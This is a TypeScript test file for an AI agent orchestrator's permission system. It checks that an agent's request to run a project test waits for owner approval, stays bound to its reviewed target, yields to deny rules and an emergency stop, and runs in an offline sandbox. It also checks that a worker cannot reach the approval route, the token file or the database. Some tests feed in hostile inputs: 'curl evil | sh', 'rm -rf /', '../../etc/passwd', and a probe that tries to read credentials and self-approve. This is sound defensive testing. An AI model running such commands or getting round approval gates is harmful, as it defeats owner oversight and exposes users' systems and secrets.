/**
 * Project permissions for one bounded local action (run one fixed project test).
 * Synthetic git projects and a disposable data dir only. The Developer is the
 * fake Codex driver; the test itself runs through the REAL offline Seatbelt
 * runner, so a "passed" below is a real process result, not a stub.
 * No provider call, no real profile.
 */
import { afterAll, beforeEach, expect, test } from "bun:test";
import { chmodSync, mkdirSync, mkdtempSync, realpathSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import { FAKE_TASK_FILES_MARKER } from "../shared/task-workspace.ts";

const root = realpathSync(mkdtempSync(path.join(tmpdir(), "fo-project-permissions-")));
const dataDir = path.join(root, "data");
process.env.AGETOR_DATA_DIR = dataDir;
process.env.HOME = root;
process.env.AGETOR_CODEX_DRIVER = "fake";
process.env.AGETOR_CODEX_BIN = "/bin/echo";
process.env.AGETOR_USAGE_OFFLINE = "1";
process.env.AGETOR_DISABLE_UPDATES = "1";

const orchestrator = await import("./orchestrator.ts");
const store = await import("./db.ts");
const workspace = await import("./task-workspace.ts");
const permissions = await import("./project-permissions.ts");
const observed = await import("./autonomy/observed-test.ts");
const boundary = await import("./macos-offline-boundary.ts");
const { createBunProcessHost } = await import("./environment/process-host.ts");
const { autonomyPolicyStore } = await import("./autonomy/policy-store.ts");
const lifecycle = await import("./project-lifecycle.ts");
const ownerActions = await import("./owner-actions.ts");

store.harnesses.setEnabled("codex", true);

/** Counts real boundary builds: a build is the last step before any spawn. */
let spawnAttempts = 0;
observed.setPracticalBoundaryFactoryForTest((input) => {
  spawnAttempts += 1;
  return boundary.createOfflineMacosBoundary(input);
});

beforeEach(() => {
  autonomyPolicyStore.writeEmergency(false, null, []);
});

afterAll(() => {
  observed.setPracticalBoundaryFactoryForTest(null);
  rmSync(root, { recursive: true, force: true });
});

const clampSource = `export function clampInt(value: number, min: number, max: number): number {
  return Math.min(Math.max(value, min), max);
}
`;
const clampTest = `import { expect, test } from "bun:test";
import { clampInt } from "./clamp.ts";
test("clamps", () => { expect(clampInt(12, 0, 10)).toBe(10); expect(clampInt(-3, 0, 10)).toBe(0); });
`;

async function git(cwd: string, args: string[]): Promise<void> {
  const proc = Bun.spawn(["git", "--no-optional-locks", "-C", cwd, ...args], { stdout: "pipe", stderr: "pipe" });
  if ((await proc.exited) !== 0) throw new Error(await new Response(proc.stderr).text());
}

/** A registered project whose Developer run has settled in a task-owned workspace. */
async function settledTask(name: string, promptExtra = ""): Promise<{ dir: string; taskId: string; staging: string }> {
  const dir = path.join(root, name);
  mkdirSync(path.join(dir, "src"), { recursive: true });
  writeFileSync(path.join(dir, "README.md"), "# fixture\n");
  writeFileSync(path.join(dir, "src/clamp.test.ts"), clampTest);
  await git(dir, ["init", "-b", "main"]);
  await git(dir, ["add", "README.md", "src/clamp.test.ts"]);
  await git(dir, ["-c", "user.email=fo@example.com", "-c", "user.name=FO", "commit", "-m", "seed"]);
  store.projects.upsert(dir, name);
  const projectPath = realpathSync(dir);
  const created = await orchestrator.createTask({
    title: `Task ${name}`,
    prompt: `Add src/clamp.ts.\n${promptExtra}\n${FAKE_TASK_FILES_MARKER}:${JSON.stringify({ writes: [{ path: "src/clamp.ts", contents: clampSource }] })}`,
    workdir: projectPath,
    column: "ready",
    agent: "codex",
    mode: "auto",
    model: "gpt-6.1-sol",
    effort: "low",
    isolation: "none",
  });
  if ("error" in created) throw new Error(created.error);
  const taskId = created.task.id;
  const prepared = await workspace.prepareTaskWorkspace(taskId, { outputPaths: ["src/clamp.ts"] });
  const started = await orchestrator.startTask(taskId);
  if ("error" in started) throw new Error(started.error);
  for (let i = 0; i < 150; i++) {
    if (workspace.getTaskWorkspace(taskId)?.status === "settled") break;
    await Bun.sleep(20);
  }
  expect(workspace.getTaskWorkspace(taskId)?.status).toBe("settled");
  return { dir: projectPath, taskId, staging: prepared.stagingPath };
}

function approvalBody(request: { projectPath: string; commandFingerprint: string }) {
  return { projectPath: request.projectPath, commandFingerprint: request.commandFingerprint };
}

test("Ask is the default: a request waits, nothing is started, reads have no side effects", async () => {
  const { dir, taskId } = await settledTask("ask-default");
  const before = spawnAttempts;
  const request = await permissions.requestProjectTest({ taskId });
  expect(request.status).toBe("pending");
  expect(request.command).toBe("bun test ./src/clamp.test.ts");
  expect(request.cwd).toContain("task-workspaces");
  expect(request.projectPath).toBe(dir);
  // Opening the request, the list, Settings and the attention roll-up run nothing.
  permissions.readProjectPermissions({ projectPath: dir });
  permissions.readProjectPermissions();
  expect(permissions.getRequest(request.id)?.status).toBe("pending");
  expect(ownerActions.readOwnerActions().projectPermissionRequests?.map((row) => row.id)).toContain(request.id);
  expect(spawnAttempts).toBe(before);
  // The same exact ask is not queued twice.
  await expect(permissions.requestProjectTest({ taskId })).rejects.toThrow(/already open/);
});

test("Allow once runs the real fixture test in the offline sandbox, exactly once", async () => {
  const { taskId } = await settledTask("allow-once");
  const request = await permissions.requestProjectTest({ taskId });
  const before = spawnAttempts;
  const done = await permissions.approveOnce(request.id, approvalBody(request));
  expect(spawnAttempts).toBe(before + 1);
  expect(done.status).toBe("completed");
  expect(done.authority).toBe("owner-once");
  expect(done.exitCode).toBe(0);
  expect(done.isolation).toBe("macos-offline-seatbelt");
  expect(done.summary).toMatch(/1 pass/);
  // Replay: the grant was consumed. Nothing runs again, also after a "reload".
  await expect(permissions.approveOnce(request.id, approvalBody(request))).rejects.toThrow(/already completed/);
  expect(permissions.readProjectPermissions().requests.find((row) => row.id === request.id)?.status).toBe("completed");
  expect(spawnAttempts).toBe(before + 1);
});

test("two simultaneous approvals run one process", async () => {
  const { taskId } = await settledTask("race");
  const request = await permissions.requestProjectTest({ taskId });
  const before = spawnAttempts;
  const results = await Promise.allSettled([
    permissions.approveOnce(request.id, approvalBody(request)),
    permissions.approveOnce(request.id, approvalBody(request)),
  ]);
  expect(results.filter((r) => r.status === "fulfilled").length).toBe(1);
  expect(results.filter((r) => r.status === "rejected").length).toBe(1);
  expect(spawnAttempts).toBe(before + 1);
});

test("Deny starts no process and the denial is final", async () => {
  const { taskId } = await settledTask("deny");
  const request = await permissions.requestProjectTest({ taskId });
  const before = spawnAttempts;
  const denied = permissions.denyRequest(request.id);
  expect(denied.status).toBe("denied");
  expect(denied.reason).toMatch(/No process was started/);
  await expect(permissions.approveOnce(request.id, approvalBody(request))).rejects.toThrow(/already denied/);
  expect(spawnAttempts).toBe(before);
});

test("an approval is bound to its project, command and directory", async () => {
  const { taskId } = await settledTask("binding");
  const other = await settledTask("binding-other");
  const request = await permissions.requestProjectTest({ taskId });
  const before = spawnAttempts;
  await expect(permissions.approveOnce(request.id, { projectPath: other.dir, commandFingerprint: request.commandFingerprint })).rejects.toThrow(/different project/);
  await expect(permissions.approveOnce(request.id, { projectPath: request.projectPath, commandFingerprint: "0".repeat(64) })).rejects.toThrow(/different command or directory/);
  expect(permissions.getRequest(request.id)?.status).toBe("pending"); // a wrong echo does not spend the grant
  expect(spawnAttempts).toBe(before);
  // The other project's task derives its own command/cwd: this request's fingerprint never matches it.
  const otherRequest = await permissions.requestProjectTest({ taskId: other.taskId });
  expect(otherRequest.commandFingerprint).not.toBe(request.commandFingerprint);
  expect(otherRequest.cwd).not.toBe(request.cwd);
});

test("a changed source after the request spends the approval and runs nothing", async () => {
  const { taskId, staging } = await settledTask("changed-source");
  const request = await permissions.requestProjectTest({ taskId });
  const before = spawnAttempts;
  writeFileSync(path.join(staging, "src/clamp.ts"), clampSource + "// edited after the request\n");
  const blocked = await permissions.approveOnce(request.id, approvalBody(request));
  expect(blocked.status).toBe("blocked");
  expect(blocked.reason).toMatch(/changed after the request/);
  expect(spawnAttempts).toBe(before);
  await expect(permissions.approveOnce(request.id, approvalBody(request))).rejects.toThrow(/already blocked/);
});

test("an expired request cannot be approved", async () => {
  const { taskId } = await settledTask("expiry");
  const request = await permissions.requestProjectTest({ taskId });
  store.db.run(`UPDATE project_permission_requests SET expires_at = ? WHERE id = ?`, [Date.now() - 1, request.id]);
  const before = spawnAttempts;
  // Shown as expired without any write, and no longer offered to the Owner.
  expect(permissions.readProjectPermissions().requests.find((row) => row.id === request.id)?.status).toBe("expired");
  expect(ownerActions.readOwnerActions().projectPermissionRequests?.map((row) => row.id)).not.toContain(request.id);
  await expect(permissions.approveOnce(request.id, approvalBody(request))).rejects.toThrow(/expired/);
  expect(permissions.getRequest(request.id)?.status).toBe("expired");
  expect(spawnAttempts).toBe(before);
});

test("a project rule allows only its exact command and a revoked rule stops authorizing after reload", async () => {
  const { dir, taskId } = await settledTask("rule");
  expect(() => permissions.addAllowRule(dir, "bun test ./../escape.test.ts")).toThrow(/not a fixed test command/);
  expect(() => permissions.addAllowRule(dir, "rm -rf /")).toThrow(/Only one fixed test command/);
  expect(() => permissions.addAllowRule("/not/registered", "bun test ./src/clamp.test.ts")).toThrow(/not registered/);
  const rule = permissions.addAllowRule(dir, "bun test ./src/clamp.test.ts");
  const before = spawnAttempts;
  const ran = await permissions.requestProjectTest({ taskId });
  expect(ran.status).toBe("completed");
  expect(ran.authority).toBe("project-rule");
  expect(ran.ruleId).toBe(rule.id);
  expect(spawnAttempts).toBe(before + 1);

  permissions.revokeRule(rule.id);
  // "Reload": nothing but the database remains.
  expect(permissions.listRules(dir)).toEqual([]);
  const after = await permissions.requestProjectTest({ taskId });
  expect(after.status).toBe("pending");
  expect(spawnAttempts).toBe(before + 1);
});

test("a deny rule wins over an allow rule, and a project default Deny records the denial", async () => {
  const { dir, taskId } = await settledTask("deny-rule");
  permissions.addAllowRule(dir, "bun test ./src/clamp.test.ts");
  permissions.setProjectDefault(dir, "deny");
  const before = spawnAttempts;
  const request = await permissions.requestProjectTest({ taskId });
  expect(request.status).toBe("denied");
  expect(request.reason).toMatch(/denies/);
  expect(spawnAttempts).toBe(before);
  permissions.setProjectDefault(dir, "ask");
  expect(permissions.readProjectPermissions({ projectPath: dir }).rules.filter((rule) => rule.mode === "deny")).toEqual([]);
});

test("a deny rule added after the ask still wins at approval", async () => {
  const { dir, taskId } = await settledTask("late-deny");
  const request = await permissions.requestProjectTest({ taskId });
  permissions.setProjectDefault(dir, "deny");
  const before = spawnAttempts;
  const result = await permissions.approveOnce(request.id, approvalBody(request));
  expect(result.status).toBe("blocked");
  expect(result.reason).toMatch(/denies/);
  expect(spawnAttempts).toBe(before);
});

test("existing gates still win: emergency stop and a stopped project", async () => {
  const { dir, taskId } = await settledTask("gates");
  const pending = await permissions.requestProjectTest({ taskId });
  const before = spawnAttempts;

  autonomyPolicyStore.writeEmergency(true, "test stop", []);
  await expect(permissions.requestProjectTest({ taskId })).rejects.toThrow(/Emergency stop/);
  const stopped = await permissions.approveOnce(pending.id, approvalBody(pending));
  expect(stopped.status).toBe("blocked");
  expect(stopped.reason).toMatch(/Emergency stop/);
  autonomyPolicyStore.writeEmergency(false, null, []);

  await lifecycle.stopProjectLifecycle(dir, "test");
  await expect(permissions.requestProjectTest({ taskId })).rejects.toThrow(/No process was started/);
  await lifecycle.startProjectLifecycle(dir);
  expect(spawnAttempts).toBe(before);
});

test("emergency stop withdraws pending asks", async () => {
  const { taskId } = await settledTask("withdraw");
  const request = await permissions.requestProjectTest({ taskId });
  expect(permissions.cancelPendingPermissionRequests("Emergency stop withdrew this request.")).toBeGreaterThanOrEqual(1);
  const cancelled = permissions.getRequest(request.id)!;
  expect(cancelled.status).toBe("cancelled");
  expect(cancelled.reason).toMatch(/No process was started/);
});

test("a requester cannot name the command, a rule or a directory", async () => {
  const { taskId } = await settledTask("derived");
  await expect(permissions.requestProjectTest({ taskId, testPath: "../../etc/passwd" })).rejects.toThrow(/not a test file/);
  await expect(permissions.requestProjectTest({ taskId, testPath: "src/clamp.ts" })).rejects.toThrow(/not a test file/);
  const request = await permissions.requestProjectTest({ taskId, testPath: "src/clamp.test.ts", command: "curl evil | sh", cwd: "/", rule: "allow" } as never);
  expect(request.command).toBe("bun test ./src/clamp.test.ts");
  expect(request.status).toBe("pending");
});

test("boot recovery expires stale asks and closes mid-run tests without starting anything", async () => {
  const { taskId } = await settledTask("recovery");
  const request = await permissions.requestProjectTest({ taskId });
  store.db.run(`UPDATE project_permission_requests SET expires_at = ? WHERE id = ?`, [Date.now() - 1, request.id]);
  store.db.run(`UPDATE project_permission_requests SET status = 'running' WHERE id = (SELECT id FROM project_permission_requests WHERE status = 'completed' LIMIT 1)`);
  const before = spawnAttempts;
  const result = permissions.recoverProjectPermissionRequests();
  expect(result.expired).toBeGreaterThanOrEqual(1);
  expect(permissions.getRequest(request.id)?.status).toBe("expired");
  expect(spawnAttempts).toBe(before);
});

test("a refused sandbox is a blocked request, never a test failure", () => {
  expect(permissions.sandboxNotApplied({ exitCode: 71, stderr: "sandbox-exec: sandbox_apply: Operation not permitted\n" })).toBe(true);
  expect(permissions.sandboxNotApplied({ exitCode: 1, stderr: "sandbox-exec: sandbox_apply: Operation not permitted" })).toBe(false);
  expect(permissions.sandboxNotApplied({ exitCode: 71, stderr: "1 fail" })).toBe(false);
  expect(permissions.sandboxNotApplied({ exitCode: 0, stderr: "" })).toBe(false);
});

test("preview is read-only: it reports eligibility, the derived target and what a submission would do, and creates nothing", async () => {
  // A task with no workspace: the backend's own reason, no target.
  const bare = await orchestrator.createTask({ title: "No workspace", prompt: "x", workdir: (await settledTask("preview-bare-project")).dir, column: "ready", agent: "codex", mode: "auto", model: "gpt-6.1-sol", effort: "low", isolation: "none" });
  if ("error" in bare) throw new Error(bare.error);
  const none = permissions.previewProjectTest(bare.task.id);
  expect(none.eligible).toBe(false);
  expect(none.code).toBe("workspace");
  expect(none.reason).toMatch(/No process was started/);
  expect(none.target).toBeNull();

  const { dir, taskId } = await settledTask("preview");
  const countRows = () => store.db.query<{ n: number }, []>(`SELECT COUNT(*) AS n FROM project_permission_requests`).get()!.n;
  const rows = countRows();
  const attempts = spawnAttempts;
  const ask = permissions.previewProjectTest(taskId);
  expect(ask.eligible).toBe(true);
  expect(ask.effect).toBe("ask");
  expect(ask.target?.command).toBe("bun test ./src/clamp.test.ts");
  expect(ask.target?.projectPath).toBe(dir);
  for (let i = 0; i < 5; i++) permissions.previewProjectTest(taskId); // "reopen / refresh"
  expect(countRows()).toBe(rows);
  expect(spawnAttempts).toBe(attempts);

  const rule = permissions.addAllowRule(dir, "bun test ./src/clamp.test.ts");
  expect(permissions.previewProjectTest(taskId).effect).toBe("allow");
  expect(permissions.previewProjectTest(taskId).ruleId).toBe(rule.id);
  permissions.revokeRule(rule.id);
  permissions.setProjectDefault(dir, "deny");
  expect(permissions.previewProjectTest(taskId).effect).toBe("deny");
  permissions.setProjectDefault(dir, "ask");
  expect(countRows()).toBe(rows);
  expect(spawnAttempts).toBe(attempts);

  // An open request makes the preview say so instead of offering a second one.
  const reviewed = { projectPath: ask.target!.projectPath, commandFingerprint: ask.target!.commandFingerprint, sourceFingerprint: ask.target!.sourceFingerprint };
  const request = await permissions.requestProjectTest({ taskId, reviewed });
  const open = permissions.previewProjectTest(taskId);
  expect(open.eligible).toBe(false);
  expect(open.code).toBe("open");
  expect(open.openRequestId).toBe(request.id);
  expect(open.requests[0]?.status).toBe("pending");
});

test("a submission must carry the reviewed target; a changed target is refused and records nothing", async () => {
  const { taskId, staging } = await settledTask("reviewed");
  const other = await settledTask("reviewed-other");
  const countRows = () => store.db.query<{ n: number }, [string]>(`SELECT COUNT(*) AS n FROM project_permission_requests WHERE task_id = ?`).get(taskId)!.n;
  const shown = permissions.previewProjectTest(taskId).target!;
  const reviewed = { projectPath: shown.projectPath, commandFingerprint: shown.commandFingerprint, sourceFingerprint: shown.sourceFingerprint };
  const attempts = spawnAttempts;
  // Source changed after the Owner looked: refused up front, nothing recorded.
  writeFileSync(path.join(staging, "src/clamp.ts"), clampSource + "// changed after review\n");
  await expect(permissions.requestProjectTest({ taskId, reviewed })).rejects.toThrow(/Review it again/);
  expect(countRows()).toBe(0);
  // Another project's task, a wrong fingerprint or a missing field never match what was shown.
  await expect(permissions.requestProjectTest({ taskId: other.taskId, reviewed })).rejects.toThrow(/Review it again/);
  await expect(permissions.requestProjectTest({ taskId, reviewed: { ...reviewed, commandFingerprint: "0".repeat(64) } })).rejects.toThrow(/Review it again/);
  await expect(permissions.requestProjectTest({ taskId, reviewed: { projectPath: reviewed.projectPath, commandFingerprint: reviewed.commandFingerprint } })).rejects.toThrow(/Review it again/);
  expect(countRows()).toBe(0);
  // A fresh review of the new target is accepted.
  const fresh = permissions.previewProjectTest(taskId).target!;
  await expect(permissions.requestProjectTest({ taskId, reviewed: { projectPath: fresh.projectPath, commandFingerprint: fresh.commandFingerprint, sourceFingerprint: fresh.sourceFingerprint } })).resolves.toMatchObject({ status: "pending" });
  expect(spawnAttempts).toBe(attempts);
});

test("each decided request leaves one concise journal record: outcome and authority, no output", async () => {
  const { taskId } = await settledTask("journal");
  const target = permissions.previewProjectTest(taskId).target!;
  const request = await permissions.requestProjectTest({ taskId, reviewed: { projectPath: target.projectPath, commandFingerprint: target.commandFingerprint, sourceFingerprint: target.sourceFingerprint } });
  await permissions.approveOnce(request.id, { projectPath: request.projectPath, commandFingerprint: request.commandFingerprint });
  const rows = store.db.query<{ event_type: string; payload_json: string; actor_type: string }, [string]>(
    `SELECT event_type, payload_json, actor_type FROM activity_events WHERE idempotency_key = ?`,
  ).all(`permission-test:${request.id}:finished`);
  expect(rows.length).toBe(1);
  expect(rows[0]!.event_type).toBe("permission.test.finished");
  const payload = JSON.parse(rows[0]!.payload_json);
  expect(payload).toMatchObject({ requestId: request.id, status: "completed", authority: "owner-once", exitCode: 0 });
  expect(JSON.stringify(payload)).not.toMatch(/1 pass|clampInt|stdout|token/i);
  // Replaying the approval does not add a second record.
  await expect(permissions.approveOnce(request.id, { projectPath: request.projectPath, commandFingerprint: request.commandFingerprint })).rejects.toThrow();
  expect(store.db.query<{ n: number }, [string]>(`SELECT COUNT(*) AS n FROM activity_events WHERE idempotency_key = ?`).get(`permission-test:${request.id}:finished`)!.n).toBe(1);
});

test("the supported worker runtime (offline Seatbelt) cannot reach the approval mutation, the token file or the database", async () => {
  // A stand-in listener that counts any call to an approval route.
  let hits = 0;
  const listener = Bun.serve({ port: 0, hostname: "127.0.0.1", fetch() { hits += 1; return Response.json({ ok: true }); } });
  // The database singleton may have opened another data dir when several test files share one process.
  const activeDataDir = store.dataDir;
  const credsFile = path.join(activeDataDir, "agetor-core.json");
  writeFileSync(credsFile, JSON.stringify({ port: listener.port, token: "synthetic-token", pid: process.pid }), { mode: 0o600 });
  const probeProject = path.join(root, "probe", "project");
  const probeScratch = path.join(root, "probe", "scratch");
  mkdirSync(probeProject, { recursive: true });
  mkdirSync(probeScratch, { recursive: true });
  chmodSync(probeScratch, 0o700);
  writeFileSync(path.join(probeProject, "probe.ts"), `
import { readFileSync } from "node:fs";
const out: Record<string, string | number> = {};
try {
  const r = await fetch("http://127.0.0.1:${listener.port}/project-permissions/requests/x/approve", { method: "POST", headers: { authorization: "Bearer synthetic-token" }, body: "{}" });
  out.fetch = r.status;
} catch (e) { out.fetch = "blocked"; }
for (const [name, file] of [["creds", ${JSON.stringify(credsFile)}], ["db", ${JSON.stringify(path.join(activeDataDir, "agetor.sqlite"))}]] as const) {
  try { out[name] = readFileSync(file).length; } catch (e) { out[name] = "blocked:" + (e as NodeJS.ErrnoException).code; }
}
console.log("PROBE " + JSON.stringify(out));
`);
  const run = async (sandboxed: boolean): Promise<Record<string, string | number>> => {
    const chunks: string[] = [];
    const host = createBunProcessHost({ perlAvailable: false });
    let started;
    if (sandboxed) {
      const b = boundary.createOfflineMacosBoundary({ project: realpathSync(probeProject), scratch: realpathSync(probeScratch), role: "developer", executable: process.execPath });
      started = await host.start(boundary.offlineBoundaryRequest(b, ["run", "./probe.ts"], "b".repeat(32), (_s, text) => chunks.push(text)));
    } else {
      started = await host.start({ executable: process.execPath, args: ["run", "./probe.ts"], cwd: realpathSync(probeProject), processGroup: true, token: "c".repeat(32), onOutput: (_s, text) => chunks.push(text), env: { PATH: process.env.PATH ?? "/usr/bin:/bin", HOME: root } });
    }
    if (!started.ok) throw new Error(started.detail);
    await started.process.exited;
    const line = chunks.join("").split("\n").find((l) => l.startsWith("PROBE "));
    if (!line) throw new Error("probe printed nothing: " + chunks.join(""));
    return JSON.parse(line.slice(6));
  };
  try {
    // Control: an unsandboxed same-user process reaches all three. This is the documented limit.
    const control = await run(false);
    expect(control.fetch).toBe(200);
    expect(typeof control.creds).toBe("number");
    expect(hits).toBe(1);
    // The supported worker runtime: nothing is reachable, and no approval call arrives.
    hits = 0;
    const worker = await run(true);
    expect(worker.fetch).toBe("blocked");
    expect(String(worker.creds)).toMatch(/^blocked/);
    expect(String(worker.db)).toMatch(/^blocked/);
    expect(hits).toBe(0);
  } finally {
    listener.stop(true);
    rmSync(credsFile, { force: true });
  }
});

// ------------------------------------------------------------------ FO-PERMISSIONS-04: review evidence

const EVIDENCE_TABLES = ["practical_test_attempts", "autonomy_mission_bindings", "mission_wait_transitions", "mission_plan_revisions", "task_quality_reviews", "autonomy_decisions", "autonomy_action_reservations", "task_dependencies"];

function tableCounts(): Record<string, number> {
  const out: Record<string, number> = {};
  for (const table of [...EVIDENCE_TABLES, "project_permission_requests"]) {
    try {
      out[table] = store.db.query<{ n: number }, []>(`SELECT COUNT(*) AS n FROM ${table}`).get()!.n;
    } catch {
      throw new Error(`expected table ${table} to exist`);
    }
  }
  return out;
}

function taskRowJson(taskId: string): string {
  return JSON.stringify(store.db.query(`SELECT * FROM tasks WHERE id = ?`).get(taskId));
}

test("evidence: no request is not-run, not a failure and not a pass", async () => {
  const { taskId } = await settledTask("ev-none");
  const evidence = permissions.readProjectTestEvidence(taskId);
  expect(evidence.kind).toBe("not-run");
  expect(evidence.latest).toBeNull();
  expect(evidence.lastResult).toBeNull();
  expect(evidence.currentPass).toBe(false);
  expect(() => permissions.readProjectTestEvidence("missing-task")).toThrow(/not found/);
});

test("evidence: a real passed run is current, and it changes no QC, Done, mission or attempt state", async () => {
  const { taskId } = await settledTask("ev-pass");
  // The Developer run's own bookkeeping (column flip) finishes just after the workspace settles: let it land first.
  for (let i = 0; i < 150 && store.tasks.get(taskId)?.column === "running"; i++) await Bun.sleep(20);
  const request = await permissions.requestProjectTest({ taskId });
  const taskBefore = taskRowJson(taskId);
  const countsBefore = tableCounts();
  const done = await permissions.approveOnce(request.id, approvalBody(request));
  expect(done.status).toBe("completed");

  const evidence = permissions.readProjectTestEvidence(taskId);
  expect(evidence.kind).toBe("passed");
  expect(evidence.latest?.requestId).toBe(request.id);
  expect(evidence.latest?.command).toBe("bun test ./src/clamp.test.ts");
  expect(evidence.latest?.exitCode).toBe(0);
  expect(evidence.latest?.freshness).toBe("current");
  expect(evidence.latest?.freshnessReason).toBe("matches");
  expect(evidence.currentPass).toBe(true);
  // The evidence carries no output: the bounded summary stays in the request record.
  expect(JSON.stringify(evidence)).not.toMatch(/1 pass/);

  // Only the permission request moved. The task row, QC, Done, mission and practical-attempt tables are untouched.
  expect(taskRowJson(taskId)).toBe(taskBefore);
  const task = store.tasks.get(taskId)!;
  expect(task.column).not.toBe("done");
  expect(task.qcState?.latestVerdict ?? null).toBeNull();
  const countsAfter = tableCounts();
  expect({ ...countsAfter, project_permission_requests: 0 }).toEqual({ ...countsBefore, project_permission_requests: 0 });
});

test("evidence: a pass is historical once the source changes, current again only when the bytes match, unverified when no workspace holds them", async () => {
  const { taskId, staging } = await settledTask("ev-stale");
  const request = await permissions.requestProjectTest({ taskId });
  await permissions.approveOnce(request.id, approvalBody(request));
  expect(permissions.readProjectTestEvidence(taskId).currentPass).toBe(true);

  writeFileSync(path.join(staging, "src/clamp.ts"), clampSource + "// edited after the pass\n");
  const stale = permissions.readProjectTestEvidence(taskId);
  expect(stale.kind).toBe("passed"); // the fact stays recorded
  expect(stale.latest?.freshness).toBe("historical");
  expect(stale.latest?.freshnessReason).toBe("source-changed");
  expect(stale.currentPass).toBe(false);

  writeFileSync(path.join(staging, "src/clamp.ts"), clampSource);
  expect(permissions.readProjectTestEvidence(taskId).latest?.freshness).toBe("current");

  workspace.abandonTaskWorkspace(taskId);
  const gone = permissions.readProjectTestEvidence(taskId);
  expect(gone.latest?.freshness).toBe("unverified");
  expect(gone.latest?.freshnessReason).toBe("workspace-unavailable");
  expect(gone.currentPass).toBe(false);
});

test("evidence: another task's or project's result is never shown", async () => {
  const a = await settledTask("ev-iso-a");
  const b = await settledTask("ev-iso-b");
  const requestA = await permissions.requestProjectTest({ taskId: a.taskId });
  await permissions.approveOnce(requestA.id, approvalBody(requestA));
  const evidenceB = permissions.readProjectTestEvidence(b.taskId);
  expect(evidenceB.kind).toBe("not-run");
  expect(evidenceB.latest).toBeNull();
  expect(permissions.readProjectTestEvidence(a.taskId).latest?.requestId).toBe(requestA.id);

  // A row that names this task but another project is not read either: it cannot be proof here.
  store.db.run(`UPDATE project_permission_requests SET project_path = ? WHERE id = ?`, [b.dir, requestA.id]);
  const forged = permissions.readProjectTestEvidence(a.taskId);
  expect(forged.kind).toBe("not-run");
  expect(forged.latest).toBeNull();
  // ...and the project's other task still sees nothing, because the row names a different task.
  expect(permissions.readProjectTestEvidence(b.taskId).latest).toBeNull();
  store.db.run(`UPDATE project_permission_requests SET project_path = ? WHERE id = ?`, [a.dir, requestA.id]);

  // A task that now belongs to another project does not inherit its old project's results.
  store.db.run(`UPDATE tasks SET workdir = ? WHERE id = ?`, [b.dir, a.taskId]);
  expect(permissions.readProjectTestEvidence(a.taskId).latest).toBeNull();
  store.db.run(`UPDATE tasks SET workdir = ? WHERE id = ?`, [a.dir, a.taskId]);
  expect(permissions.readProjectTestEvidence(a.taskId).latest?.requestId).toBe(requestA.id);
});

test("evidence: denied, cancelled, expired and blocked requests did not run; they are not failed tests", async () => {
  const { taskId } = await settledTask("ev-noresult");
  const denied = await permissions.requestProjectTest({ taskId });
  permissions.denyRequest(denied.id);
  let evidence = permissions.readProjectTestEvidence(taskId);
  expect(evidence.kind).toBe("did-not-run");
  expect(evidence.latest?.status).toBe("denied");
  expect(evidence.latest?.freshness).toBeNull();
  expect(evidence.lastResult).toBeNull();

  for (const [status, reason] of [
    ["blocked", "The offline sandbox could not be applied here (sandbox-exec refused to start it). The test did not run and no pass was recorded."],
    ["cancelled", "The request was cancelled. No process was started."],
  ] as const) {
    const request = await permissions.requestProjectTest({ taskId });
    store.db.run(`UPDATE project_permission_requests SET status = ?, reason = ?, decided_at = ?, finished_at = ? WHERE id = ?`, [status, reason, Date.now(), Date.now(), request.id]);
    evidence = permissions.readProjectTestEvidence(taskId);
    expect(evidence.kind).toBe("did-not-run");
    expect(evidence.latest?.status).toBe(status);
    expect(evidence.latest?.exitCode).toBeNull();
    expect(evidence.currentPass).toBe(false);
  }
  const expired = await permissions.requestProjectTest({ taskId });
  store.db.run(`UPDATE project_permission_requests SET expires_at = ? WHERE id = ?`, [Date.now() - 1, expired.id]);
  expect(permissions.readProjectTestEvidence(taskId).kind).toBe("did-not-run");
  expect(permissions.readProjectTestEvidence(taskId).latest?.status).toBe("expired");
});

test("evidence: an interrupted request reads as interrupted, result unknown, not as 'did not run'", async () => {
  const { taskId } = await settledTask("ev-interrupted");
  const request = await permissions.requestProjectTest({ taskId });
  // `running` is claimed before the process is spawned, so boot recovery cannot tell whether a test started.
  store.db.run(`UPDATE project_permission_requests SET status = 'running', decided_at = ?, started_at = ? WHERE id = ?`, [Date.now(), Date.now(), request.id]);
  permissions.recoverProjectPermissionRequests();
  const evidence = permissions.readProjectTestEvidence(taskId);
  expect(evidence.latest?.status).toBe("interrupted");
  expect(evidence.kind).toBe("interrupted");
  expect(evidence.kind).not.toBe("did-not-run");
  expect(evidence.latest?.freshness).toBeNull();
  expect(evidence.currentPass).toBe(false);
  // Only an observed exit code is a result: a failed row with none is also unknown, not a recorded failure.
  const second = await permissions.requestProjectTest({ taskId });
  store.db.run(`UPDATE project_permission_requests SET status = 'failed', exit_code = NULL, decided_at = ?, finished_at = ? WHERE id = ?`, [Date.now(), Date.now(), second.id]);
  expect(permissions.readProjectTestEvidence(taskId).kind).toBe("interrupted");
});

test("evidence: a newer pending, blocked or failed attempt is not hidden by an earlier pass", async () => {
  const { taskId, staging } = await settledTask("ev-newer");
  const first = await permissions.requestProjectTest({ taskId });
  await permissions.approveOnce(first.id, approvalBody(first));
  expect(permissions.readProjectTestEvidence(taskId).kind).toBe("passed");
  await Bun.sleep(5);

  // Newer attempt waiting: the headline is the pending request, the pass is shown as earlier and is no current proof.
  const pending = await permissions.requestProjectTest({ taskId });
  let evidence = permissions.readProjectTestEvidence(taskId);
  expect(evidence.kind).toBe("pending");
  expect(evidence.latest?.requestId).toBe(pending.id);
  expect(evidence.lastResult?.requestId).toBe(first.id);
  expect(evidence.currentPass).toBe(false);

  // Denied: the headline is "did not run", still not the earlier pass.
  permissions.denyRequest(pending.id);
  evidence = permissions.readProjectTestEvidence(taskId);
  expect(evidence.kind).toBe("did-not-run");
  expect(evidence.lastResult?.kind).toBe("passed");
  expect(evidence.currentPass).toBe(false);
  await Bun.sleep(5);

  // A newer real run that fails replaces the pass as the headline.
  writeFileSync(path.join(staging, "src/clamp.ts"), clampSource.replace("Math.min(Math.max(value, min), max)", "value"));
  const failing = await permissions.requestProjectTest({ taskId });
  const ran = await permissions.approveOnce(failing.id, approvalBody(failing));
  expect(ran.status).toBe("failed");
  evidence = permissions.readProjectTestEvidence(taskId);
  expect(evidence.kind).toBe("failed");
  expect(evidence.latest?.exitCode).toBe(1);
  expect(evidence.latest?.freshness).toBe("current"); // it did run against these bytes
  expect(evidence.lastResult?.requestId).toBe(failing.id);
  expect(evidence.currentPass).toBe(false);
});

test("evidence: reading and reloading is read-only", async () => {
  const { taskId } = await settledTask("ev-readonly");
  const request = await permissions.requestProjectTest({ taskId });
